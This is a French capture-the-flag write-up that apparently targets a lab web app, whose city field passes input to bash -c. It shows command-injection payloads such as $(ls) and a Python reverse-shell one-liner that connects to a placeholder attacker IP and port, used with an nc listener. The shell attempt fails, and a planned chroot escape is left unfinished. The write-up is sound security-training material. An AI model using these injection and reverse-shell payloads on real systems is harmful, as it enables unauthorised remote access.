# change-racines
# Flag 1

## Recon

Information disponible:
- http://REDACTED:9090
- https://www.cheswick.com/ches/papers/berferd.pdf

Voici l'application 

![alt text](img/app.png)

Il y a un champ Ville et un boutton pour faire un refresh.

J'appuie sur le boutton avec le champ vide et j'obtiens:
```python
(b'\n', None)
```
Bon euh, j'ai clairement affaire a du python.

`None` je vais donc metttre une ville dans le champs ville:

```python
(b'PlatypusJovial\n', None)
```
Pour rire essayons ceci:
`import os; print('\n'.join(os.listdir('.')))`

```python
(b"/bin/bash: -c: line 1: syntax error near unexpected token `'\\n'.join'\n/bin/bash: -c: line 1: `echo import os; print('\\n'.join(os.listdir('.')))'\n", None)
```
Daccord.. euh `ls`?
```python
(b'ls\n', None)
```
Humm `$(ls)`
```python
(b'__pycache__ app.py bin etc flag1 get-pip.py lib lib64 python root templates usr\n', None)
```

A ben voila! `$(cat flag1)`
```python
(b'/bin/bash: line 1: cat: command not found\n\n', None)
```

Aw.. bon ok, plan B, necessairement `python` doit etre disponible et c'est envoyer a `bash -c`. Est-ce l'heure d'un reverse shell en python vous dites ma ptite dame? Mais ABSOLUMENT! https://www.revshells.com

J'ai du l'adapter un peu
```python
$(./python/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")')
```

Et la je crois avoir brise le jouet... (Sur l'instance de writeups)
```python
nc -lvnp REDACTED
listening on [any] REDACTED ...

connect to [REDACTED] from (UNKNOWN) [REDACTED] REDACTED
Traceback (most recent call last):
  File "<string>", line 1, in <module>
  File "/python/lib/python3.9/pty.py", line 156, in spawn
    pid, master_fd = fork()
  File "/python/lib/python3.9/pty.py", line 97, in fork
    master_fd, slave_fd = openpty()
  File "/python/lib/python3.9/pty.py", line 30, in openpty
    master_fd, slave_name = _open_terminal()
  File "/python/lib/python3.9/pty.py", line 60, in _open_terminal
    raise OSError('out of pty devices')
OSError: out of pty devices
```
Oh ... 

Bon c'est peut-etre pas le temps de faire des challenges de reverse shell!

On peut decouvrir que les binaires possible d'utilise sont
`bash ls rm touch` et bien entendue python!
On se rend egalement compte que nous somme dans un `chroot`
Le concept etait de memoire de cree un nouveau `chroot` dans un dossier ou nous somme presentement a l'exterieur via l'executable python

Si l'instance se fait corriger je le terminerai! Pour le moment ma memoire de poisson mort ne se souvient plus!